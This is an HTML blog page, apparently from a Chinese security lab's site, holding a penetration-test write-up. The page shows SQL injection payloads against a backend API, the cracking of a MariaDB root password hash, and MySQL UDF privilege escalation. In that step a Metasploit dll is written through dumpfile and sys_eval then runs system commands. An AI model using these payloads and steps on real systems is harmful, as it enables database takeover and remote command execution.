@@ -1,0 +1,1054 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+<meta charset="utf-8">
+<!--dev siwtch-->
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name='apple-mobile-web-app-capable' content='yes'/>
+<meta name='full-screen' content='true'/>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--dev switch end-->
+<meta name="description" content="本站由哨兵安全实验室支持创办">
+
+    <meta name="baidu-site-verification" content="codeva-Bt0LqEvH6L" />
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-TJ5SFQ4KCM"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-TJ5SFQ4KCM');
+</script>
+<link rel="shortcut icon" href="/assets/img/favicon.png">
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="© 哨兵" />
+
+
+
+
+<!-- Open Graph metadata -->
+<meta property="og:type" content="website" />
+<meta property="og:title" content="实战-某平台SQL注入及UDF提权 | © 哨兵" />
+<meta property="og:description" content=" &lt;div class=&quot;container mtb&quot;&gt;
+    &lt;div class=&quot;row d-flex &quot;&gt;
+        &lt;!-- SINGLE POST --&gt;
+        &lt;div class=&quot;col-lg-8 markdown-body-img flex-column&quot;&gt;
+            &lt;!-- Blog Post  --&gt;
+            &lt;a href=&quot;/blog/2021/实战-某平台SQL注入及UDF提权/&quot;&gt;&lt;h1 class=&quot;ctitle&quot;&gt;实战-某平台SQL注入及UDF提权&lt;/h1&gt;&lt;/a&gt;
+            &lt;csmall&gt;&lt;div class=&quot;d-flex items-center&quot;&gt;
+                &lt;!--article author end--&gt;
+
+&lt;!-- site build time set to the latest time.--&gt;
+
+&lt;!-- post time--&gt;
+
+
+
+
+
+&lt;div class=&quot;ml-hide&quot;&gt;
+    &lt;a class=&quot;f2 d-flex color-fg-default&quot; href=&quot;https://github.com/Yang2635&quot; target=&quot;_blank&quot;&gt;
+        Yang2635
+
+        
+            
+            &lt;!-- wrench time--&gt;
+            
+        edited
+        
+
+        
+        
+        
+        
+        
+
+        
+            on Dec 6, 2021
+        
+    &lt;/a&gt;
+&lt;/div&gt;
+            &lt;/div&gt;&lt;/csmall&gt;
+            &lt;div class=&quot;post-content&quot;&gt; 
+            &lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;
+
+&lt;p&gt;在一次对某授权的平台服务渗透过程中发现网页调用接口存在SQL注入漏洞、所对应MySQL数据库存在相关用户弱口令及UDF提权漏洞，并成功利用UDF提权漏洞实现对内网服务的渗透，下面是渗透记录过程，部分内容会做模糊处理。&lt;/p&gt;
+
+&lt;h3 id=&quot;后台接口sql注入&quot;&gt;后台接口SQL注入&lt;/h3&gt;
+
+&lt;p&gt;前面的渗透已成功进入了某系统平台后台，下面是直接基于在某平台后台后展开概述。&lt;/p&gt;
+
+&lt;p&gt;1、开启BurpSuite对其数据流量进行监听，在平台后台浏览过程中发现存在接口调用，遂对其接口进行相关测试。先随意在POST传参的数据里将搜索的相关数据使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&#39;&lt;/code&gt;闭合测试，发现返回了数据库语句错误信息，如下图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/12/04/20211204141650.png&quot; alt=&quot;image-20211204141129772&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;2、进一步对相关数据进行闭合测试，发现没有参数过滤及防火墙拦截。继续构造Payload，测试出SQL语句的闭合并使用Order by测试回显字段数，相关Payload如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;Nu1L&#39;) order by 6 -- Qwer
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;返回结果如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/12/04/20211204143405.png&quot; alt=&quot;image-20211204143405544&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;当字段数为6时报错，则字段数为5，且SQL语句闭合也已得知，经过简单测试发现数据库存在联合注入、布尔注入、时间盲注、报错注入。&lt;/p&gt;
+
+&lt;p&gt;3、获取数据库基本信息，由于回显字段为5，故直接使用一句话先获取相关数据库版本、用户、当前数据库信息，相关Payload如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;Nu1L&#39;) union select NuLl,nUlL,version(),database(),user() -- Qwer
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;返回数据库基本信息如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/12/04/20211204145321.png&quot; alt=&quot;image-20211204145321486&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由图得知当前服务运行的数据库为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tmc3db&lt;/code&gt;，数据库版本为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.2.32-MariaDB&lt;/code&gt;，数据库连接用户为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xiao&lt;/code&gt;。&lt;/p&gt;
+
+&lt;h3 id=&quot;mysql数据库udf提权&quot;&gt;MySQL数据库UDF提权&lt;/h3&gt;
+
+&lt;p&gt;1、根据上述数据库手工注入暂且告一段落，为方便进一步获取其数据库更多权限信息，遂改用SQLmap工具进行注入，将请求的POST请求另存为文件，并在注入点处进行标记，使用SQLmap执行获取系统、账户、是否超级用户等信息，结果如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/12/04/20211204150820.png&quot; alt=&quot;image-20211204150820474&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;得知数据库运行平台为Windows，数据库系统为MySQL，账户为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xiao@%&lt;/code&gt;，且该账户并非超级用户。&lt;/p&gt;
+
+&lt;p&gt;2、由于非超级用户的操作有限，故换个方法来查看其余用户及权限并获取其余用户密码哈希，同时再去后台平台浏览发现存在相关公网服务IP，并对相关IP进行信息收集，相关结果如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/12/04/20211204152120.png&quot; alt=&quot;image-20211204152120213&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/12/04/20211204152231.png&quot; alt=&quot;image-20211204152231716&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;发现root用户可远程主机登录且该用户具有超级用户权限，并复制密码哈希前往相关平台使用mysql5加密方式对其进行数据查询，成功获得其密码&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/12/04/20211204152629.png&quot; alt=&quot;image-20211204152629456&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;若查询不到也可将获得的哈希密码使用hashcat进行爆破，具体爆破所用时间视密码的复杂度，此处不具体概述。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;此时对相关IP服务的扫描也有了结果，发现在一处IP上存在与该数据库版本信息相同的端口开放，如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/12/04/20211204153043.png&quot; alt=&quot;image-20211204153043069&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后对其进行数据库使用root用户连接，成功连接：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/12/04/20211204154116.png&quot; alt=&quot;image-20211204154116828&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;3、查看系统版本信息进行信息确认，如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;MariaDB [mysql]&amp;gt; select @@version_compile_os, @@version_compile_machine;
++----------------------+---------------------------+
+| @@version_compile_os | @@version_compile_machine |
++----------------------+---------------------------+
+| Win64                | x64                       |
++----------------------+---------------------------+
+1 row in set (0.161 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;系统为Windows系统，是所对应的操作系统，系统架构为64位，再查看数据库是否有文件读写权限，如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;MariaDB [(none)]&amp;gt; show variables like &#39;%secure_file_priv%&#39;;
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+1 row in set (0.087 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secure_file_priv&lt;/code&gt;为纯空，数据库可任意目录读写，尝试使用load_file函数读取一下hosts文件，如图，成功读取文件信息：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/12/04/20211204154451.png&quot; alt=&quot;image-20211204154451546&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;那么也可以相应的写UDF文件进行提权。&lt;/p&gt;
+
+&lt;p&gt;4、先去Metasploit相关目录下获取到适用于Windows 64位系统的UDF提权相关dll文件（此处不用SQLmap的UDF相关文件，因为SQLmap的UDF相关文件为了防止被误杀都经过编码处理过，使用时需要处理一下，Metasploit中的不需要处理即可使用），查看数据库根目录、数据目录、插件目录，如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;MariaDB [mysql]&amp;gt; select @@basedir,@@datadir,@@plugin_dir;
++-----------+---------------+----------------------+
+| @@basedir | @@datadir     | @@plugin_dir         |
++-----------+---------------+----------------------+
+| D:\MySQL\ | D:\MySQLData\ | D:\MySQL\lib\plugin\ |
++-----------+---------------+----------------------+
+1 row in set (0.091 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;先将用于Windows下MySQL数据库UDF提权的dll文件进行十六进制编码，如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/12/04/20211204174512.png&quot; alt=&quot;image-20211204174512771&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接下来进行命令导出文件，此处注意导出使用dumpfile函数，而非outfile函数，因为outfile函数会对导出的文件内容会在行末写入新行，且更致命的是会存在对特殊字符转义操作，这样导出的二进制文件就会遭到破坏；而dumpfile函数则不对任何列或行进行终止，也不执行任何转义处理，此时导出的二进制文件还是完好的。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;上述十六进制文件获取方法是在Linux系统中使用od命令并结合awk等命令辅助完成获取，也可以使用MySQL自带的hex函数来获取编码（前提相关MySQL数据库开启对文件可读写权限），命令如下：&lt;/p&gt;
+
+  &lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;# 直接传入路径
+select hex(load_file(&#39;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll&#39;));
+
+# 也可以将路径 hex 编码
+select hex(load_file(0x2f7573722f73686172652f6d65746173706c6f69742d6672616d65776f726b2f646174612f6578706c6f6974732f6d7973716c2f6c69625f6d7973716c7564665f7379735f36342e646c6c));
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;下面开始命令导出，导出的方法如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;#直接select查十六进制写入，需在十六进制数值前加0x
+select 0x4d5a90... into dumpfile &#39;D:/MySQL/lib/plugin/udf2.dll&#39;;
+
+#对十六进制解码写入（可不必）
+select unhex(&#39;4d5a90...&#39;) into dumpfile &#39;D:/MySQL/lib/plugin/udf2.dll&#39;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;若在Windows系统下非MySQL读写文件权限导致的，在使用dumpfile函数写文件未成功，如图：&lt;/p&gt;
+
+  &lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/12/04/20211204185129.png&quot; alt=&quot;image-20211204185129464&quot; /&gt;&lt;/p&gt;
+
+  &lt;p&gt;在使用dumpfile时，涉及的路径应皆使用正斜杠“/”，上述在Windows系统中一开始在文件路径中使用反斜杠未成功写入文件，改用正斜杠之后测试成功写入UDF文件。又或者不存在对应插件目录也可导致无法写入文件，可借助NTFS流创建相关目录文件夹后在写入，此处不具体概述。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;结果如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/12/04/20211204181700.png&quot; alt=&quot;image-20211204181700116&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;成功导出，为确保文件成功导出到目标机，遂再使用load_file函数读取一下文件，如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/12/04/20211204181808.png&quot; alt=&quot;image-20211204181808437&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;成功返回文件十六进制编码，文件正确写入。&lt;/p&gt;
+
+&lt;p&gt;5、构造自定义函数并调用命令，构造函数命令如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;MariaDB [mysql]&amp;gt; create function sys_eval returns string soname &#39;udf2.dll&#39;;
+Query OK, 0 rows affected (0.213 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此处&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_eval&lt;/code&gt;函数可自定义，然后查看MySQL函数是否有新增函数，命令如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;MariaDB [mysql]&amp;gt; select * from mysql.func;
++----------+-----+----------+----------+
+| name     | ret | dl       | type     |
++----------+-----+----------+----------+
+| sys_eval |   0 | udf2.dll | function |
++----------+-----+----------+----------+
+1 row in set (0.184 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;至此成功使用自定义函数执行系统命令了，如果在 Windows 系统下的话应该就是最高权限了。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;MariaDB [mysql]&amp;gt; select sys_eval(&#39;whoami&#39;);
++------------------------------+
+| sys_eval(&#39;whoami&#39;)           |
++------------------------------+
+| nt authority\network service |
++------------------------------+
+1 row in set (0.171 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;sys_eval、sys_exec、sys_set、sys_get输出结果区别：&lt;/p&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;sys_get：获取特定环境变量的值&lt;/li&gt;
+    &lt;li&gt;sys_set：设置环境变量的值。此函数接受一个名称/值对，然后将其定义为环境变量。使用 sys_get 检索此类变量的值&lt;/li&gt;
+    &lt;li&gt;sys_exec：执行其命令字符串参数并返回其退出状态。&lt;/li&gt;
+    &lt;li&gt;sys_eval：执行其命令字符串参数并返回其标准输出。&lt;/li&gt;
+  &lt;/ul&gt;
+
+  &lt;p&gt;以Windows平台下的sys_eval与sys_exec函数执行结果如下：&lt;/p&gt;
+
+  &lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;MariaDB [mysql]&amp;gt; select sys_eval(&#39;whoami&#39;);
++------------------------------+
+| sys_eval(&#39;whoami&#39;)           |
++------------------------------+
+| nt authority\network service |
++------------------------------+
+1 row in set (0.176 sec)
+
+MariaDB [mysql]&amp;gt; select sys_exec(&#39;whoami&#39;);
++------------------------------+
+| sys_exec(&#39;whoami&#39;)           |
++------------------------------+
+|                         NULL |
++------------------------------+
+1 row in set (0.102 sec)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;6、删除自定义函数&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;drop function sys_eval;
+&lt;/code&gt;&lt;/pre&gt;
+
+
+                &lt;!-- [x] 2022/10/20/10:49:36 fixed: while width &lt; some inch. would be flex column not display like a row.--&gt;
+&lt;footer&gt;
+	&lt;style&gt;.border-top {
+		border-top: 1.5px solid #d0d7de!important;
+	}&lt;/style&gt;
+	&lt;div class=&quot;border-top&quot;&gt;&lt;/div&gt;
+		&lt;section class=&quot;container-xl mt-lg-8 mt-6 px-3 px-md-6 no-print mx-auto&quot;&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix &quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;申明&lt;/h2&gt;
+				&lt;div&gt;
+					&lt;div class=&quot;mb-2&quot;&gt;&lt;a href=&quot;/blog/2021/实战-某平台SQL注入及UDF提权/&quot; target=&quot;_blank&quot; class=&quot; text-bold&quot;&gt;
+						&lt;div class=&quot;fa fa-link&quot;&gt;&lt;/div&gt;
+						转载请申明本文档链接&lt;/a&gt;&lt;/div&gt;
+					&lt;div&gt;&lt;a href=&quot;https://github.com/Yang2635&quot; target=&quot;_blank&quot;  class=&quot;text-bold&quot;&gt;
+						&lt;div class=&quot;fa fa-user&quot;&gt;&lt;/div&gt;
+						Post by Yang2635.&lt;/a&gt;
+					&lt;/div&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix&quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;贡献开源文档&lt;/h2&gt;
+				&lt;div&gt;
+					&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/tree/main/_posts/blog/2021-12-06-实战-某平台SQL注入及UDF提权.md&quot; target=&quot;_blank&quot; class=&quot;no-underline btn mr-1 color-border-accent-emphasis&quot;&gt;
+						&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; role=&quot;img&quot; class=&quot;octicon mr-1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot; height=&quot;16&quot; fill=&quot;currentColor&quot; style=&quot;display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M7.177 3.073L9.573.677A.25.25 0 0110 .854v4.792a.25.25 0 01-.427.177L7.177 3.427a.25.25 0 010-.354zM3.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122v5.256a2.251 2.251 0 11-1.5 0V5.372A2.25 2.25 0 011.5 3.25zM11 2.5h-1V4h1a1 1 0 011 1v5.628a2.251 2.251 0 101.5 0V5A2.5 2.5 0 0011 2.5zm1 10.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0zM3.75 12a.75.75 0 100 1.5.75.75 0 000-1.5z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;
+						贡献当前开源文档
+					&lt;/a&gt;
+					&lt;p class=&quot;f0_8-l mt-2 text-bold&quot;&gt;此之前，学习开源贡献&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/wiki/Git操作-Git如何贡献仓库代码&quot;&gt;CN&amp;nbsp;|&lt;/a&gt;
+						&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/github/docs/blob/main/CONTRIBUTING.md&quot;&gt;EN&lt;/a&gt;&lt;/p&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix&quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;此文档对您有帮助吗&lt;/h2&gt;
+				&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/&quot; target=&quot;_blank&quot; class=&quot;no-underline&quot;&gt;
+				&lt;span class=&quot;btn mr-1 color-border-accent-emphasis&quot; title=&quot;给文档仓库点个赞!&quot;&gt;
+					&lt;div class=&quot;fa fa-thumbs-o-up&quot;&gt;&lt;/div&gt;
+				&lt;/span&gt;
+				&lt;/a&gt;
+				&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/issues/new?labels=Service+Issue,research&amp;template=2-bug_report.yaml&amp;title=_posts/blog/2021-12-06-实战-某平台SQL注入及UDF提权.md&amp;nbsp; 实战-某平台SQL注入及UDF提权 | © 哨兵 | SENTINEL SECURITY, LAB&quot; target=&quot;_blank&quot;&gt;
+				&lt;span class=&quot;btn mr-1 color-border-accent-emphasis&quot; title=&quot;本文档有问题?&quot;&gt;
+				&lt;div class=&quot;fa fa-thumbs-o-down&quot;&gt;&lt;/div&gt;
+				&lt;/span&gt;
+				&lt;/a&gt;
+			&lt;/div&gt;
+		&lt;/section&gt;
+&lt;/footer&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;spacing&quot;&gt;&lt;/div&gt;
+        &lt;/div&gt;&lt;!--/col-lg-8 --&gt;
+        
+&lt;div class=&quot;col-md-4 ml-hide table-of-contents__left-border&quot; style=&quot;max-height: 100%&quot;&gt;
+    &lt;div class=&quot;nav nav-stacked tableOfContents_35-E thin-scrollbar position-sticky top-0&quot;&gt;
+        &lt;li class=&quot; table-of-contents&quot;&gt;
+            &lt;code-index-css&gt;
+                &lt;ul&gt;&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column&quot;&gt;&lt;a&gt;文章目录&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
+                &lt;ul id=&quot;toc&quot; class=&quot;section-nav&quot;&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#前言&quot;&gt;前言&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#后台接口sql注入&quot;&gt;后台接口SQL注入&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#mysql数据库udf提权&quot;&gt;MySQL数据库UDF提权&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+            &lt;/code-index-css&gt;
+        &lt;/li&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+    &lt;/div&gt;&lt;!--/row --&gt;
+&lt;/div&gt;&lt;!--/container --&gt;哨兵安全实验室 SENTINEL SECURITY, LAB" />
+<meta property="og:image" content="https://bin4xin.sentrylab.cn/assets/img/logo-share.png" /> <!-- WeChat requires that thumbnail image is larger than 300x300 -->
+<meta property="og:url" content="https://bin4xin.sentrylab.cn/blog/2021/实战-某平台SQL注入及UDF提权/" />
+<title> 实战-某平台SQL注入及UDF提权 | © 哨兵 | SENTINEL SECURITY, LAB</title>
+
+<link rel="stylesheet" type="text/css" href="/assets/css/pace-minimal.css">
+<link rel="stylesheet" type="text/css" href="/assets/css/footer.css">
+<script src="/assets/js/pace.min.js"></script>
+<!-- Bootstrap core CSS -->
+<link href="/assets/css/bootstrap.css" rel="stylesheet">
+<link href="/assets/css/bilibili_icon.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+<link href="/assets/css/style.css" rel="stylesheet">
+<link href="/assets/css/font-awesome.min.css" rel="stylesheet">
+<link href="/assets/css/font-awesome-v4-shims.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="/assets/css/card.css">
+
+<script src="/assets/js/jquery.min.js"></script>
+<script src="/assets/js/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+<script src="/assets/js/jquery.sticky/1.0.4/jquery.sticky.js"></script>
+<script src="/assets/js/bootstrap.min.js"></script>
+
+<!--mathjax-config scripts.-->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$$','$$']]
+      }
+    });
+</script>
+<script src="/assets/js/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<!--mathjax-config scripts stop.-->
+
+
+
+</head>
+
+
+    <body>
+
+                <!--
+#####################################################################################################################
+|  1.Fixed navbar issues #3 visit https://github.com/Bin4xin/bin4xin.github.io/issues/3                             |
+|    change `position: fixed` to `position: sticky`                                                                 |
+|                                                                                                                   |
+|  2.Fixed navbar padding-top equals to 70px                                                                        |
+|    `./assets/css/style.scss` @import struture in `./assets/css/_struture.scss` del `padding-top=70px` in body.    |
+#####################################################################################################################-->
+<style>
+.nav>li>a {
+    padding: 10px 15px;
+}
+</style>
+<div class="navbar navbar-default navbar-fixed-top" role="navigation">
+    <div class="container">
+        <div class="navbar-header">
+            <div class="flex-justify-center-l flex-justify-between">
+                <!-- 代码引用申明/code reference declaration:
+                @ [click this icon -> scroll to top of page;] code from anquanke. visit any posts in https://www.anquanke.com/
+                <del>also this icon func are under-construction</del>
+                DONE.
+                -->
+                <div>
+                    <picture>
+  
+  
+  <source srcset="/assets/img/logo-small-dark.png 1x, /assets/img/logo-small-dark@2x.png 2x, /assets/img/logo-small-dark@3x.png 3x, /assets/img/logo-small-dark@4x.png 4x" media="(prefers-color-scheme: dark)" />
+  
+  
+  
+  <img src="/assets/img/logo-small.jpg" srcset="/assets/img/logo-small.png 1x, /assets/img/logo-small@2x.png 2x, /assets/img/logo-small@3x.png 3x, /assets/img/logo-small@4x.png 4x" />
+  
+</picture>
+                    
+                </div>
+                <div>
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button></div>
+            </div>
+        </div>
+        <div class="navbar-collapse collapse navbar-right">
+            <ul class="nav navbar-nav">
+                
+                <li ><a href="/"><div class="fa fa-search"></div></a></li>
+                <li class="active"><a href="/blog/">BLOG</a></li>
+                <li ><a href="/categories/">CATEGORIES</a></li>
+                <li ><a href="/daily/">DAILY</a></li>
+                <li ><a href="/newest">NEWEST</a></li>
+                <li ><a href="/about/">RESEARCH</a></li>
+                <li ><a href="/feed.xml">RSS</a></li>
+                
+            </ul>
+        </div><!--/.nav-collapse -->
+    </div>
+</div>
+                <div class="container mtb">
+    <div class="row d-flex ">
+        <!-- SINGLE POST -->
+        <div class="col-lg-8 markdown-body-img flex-column">
+            <!-- Blog Post  -->
+            <a href="/blog/2021/实战-某平台SQL注入及UDF提权/"><h1 class="ctitle">实战-某平台SQL注入及UDF提权</h1></a>
+            <csmall><div class="d-flex items-center">
+                <!--article author end-->
+
+<!-- site build time set to the latest time.-->
+
+<!-- post time-->
+
+
+
+
+
+<div class="ml-hide">
+    <a class="f2 d-flex color-fg-default" href="https://github.com/Yang2635" target="_blank">
+        Yang2635
+
+        
+            
+            <!-- wrench time-->
+            
+        edited
+        
+
+        
+        
+        
+        
+        
+
+        
+            on Dec 6, 2021
+        
+    </a>
+</div>
+            </div></csmall>
+            <div class="post-content"> 
+            <h3 id="前言">前言</h3>
+
+<p>在一次对某授权的平台服务渗透过程中发现网页调用接口存在SQL注入漏洞、所对应MySQL数据库存在相关用户弱口令及UDF提权漏洞，并成功利用UDF提权漏洞实现对内网服务的渗透，下面是渗透记录过程，部分内容会做模糊处理。</p>
+
+<h3 id="后台接口sql注入">后台接口SQL注入</h3>
+
+<p>前面的渗透已成功进入了某系统平台后台，下面是直接基于在某平台后台后展开概述。</p>
+
+<p>1、开启BurpSuite对其数据流量进行监听，在平台后台浏览过程中发现存在接口调用，遂对其接口进行相关测试。先随意在POST传参的数据里将搜索的相关数据使用<code class="language-plaintext highlighter-rouge">'</code>闭合测试，发现返回了数据库语句错误信息，如下图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/12/04/20211204141650.png" alt="image-20211204141129772" /></p>
+
+<p>2、进一步对相关数据进行闭合测试，发现没有参数过滤及防火墙拦截。继续构造Payload，测试出SQL语句的闭合并使用Order by测试回显字段数，相关Payload如下：</p>
+
+<pre><code class="language-mysql">Nu1L') order by 6 -- Qwer
+</code></pre>
+
+<p>返回结果如下：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/12/04/20211204143405.png" alt="image-20211204143405544" /></p>
+
+<p>当字段数为6时报错，则字段数为5，且SQL语句闭合也已得知，经过简单测试发现数据库存在联合注入、布尔注入、时间盲注、报错注入。</p>
+
+<p>3、获取数据库基本信息，由于回显字段为5，故直接使用一句话先获取相关数据库版本、用户、当前数据库信息，相关Payload如下：</p>
+
+<pre><code class="language-mysql">Nu1L') union select NuLl,nUlL,version(),database(),user() -- Qwer
+</code></pre>
+
+<p>返回数据库基本信息如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/12/04/20211204145321.png" alt="image-20211204145321486" /></p>
+
+<p>由图得知当前服务运行的数据库为<code class="language-plaintext highlighter-rouge">tmc3db</code>，数据库版本为<code class="language-plaintext highlighter-rouge">10.2.32-MariaDB</code>，数据库连接用户为<code class="language-plaintext highlighter-rouge">xiao</code>。</p>
+
+<h3 id="mysql数据库udf提权">MySQL数据库UDF提权</h3>
+
+<p>1、根据上述数据库手工注入暂且告一段落，为方便进一步获取其数据库更多权限信息，遂改用SQLmap工具进行注入，将请求的POST请求另存为文件，并在注入点处进行标记，使用SQLmap执行获取系统、账户、是否超级用户等信息，结果如下：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/12/04/20211204150820.png" alt="image-20211204150820474" /></p>
+
+<p>得知数据库运行平台为Windows，数据库系统为MySQL，账户为<code class="language-plaintext highlighter-rouge">xiao@%</code>，且该账户并非超级用户。</p>
+
